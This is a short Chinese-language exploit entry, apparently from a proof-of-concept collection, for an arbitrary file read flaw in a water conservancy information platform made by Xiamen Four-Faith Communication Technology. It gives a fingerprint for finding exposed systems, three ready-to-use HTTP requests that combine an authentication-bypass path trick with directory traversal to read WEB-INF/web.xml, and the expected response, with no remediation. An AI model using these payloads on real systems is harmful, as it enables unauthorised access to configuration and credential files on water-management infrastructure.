# 厦门四信通信科技有限公司水利信息化平台download.do存在任意文件读取漏洞

厦门四信通信科技有限公司水利信息化平台 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="水利信息化平台V2.2登录页面"`
- **请求**：`GET /generalReport/download.do;userLogin.do;?fileName=../WEB-INF/web.xml HTTP/1.1`

**Payload**
```
接口2：
GET /statistic/download.do;userLogin.do;?fileName=../WEB-INF/web.xml HTTP/1.1
接口3：
GET /stAlarmInfo/download.do;userLogin.do;?fileName=../WEB-INF/web.xml HTTP/1.1
```
- **响应特征**：200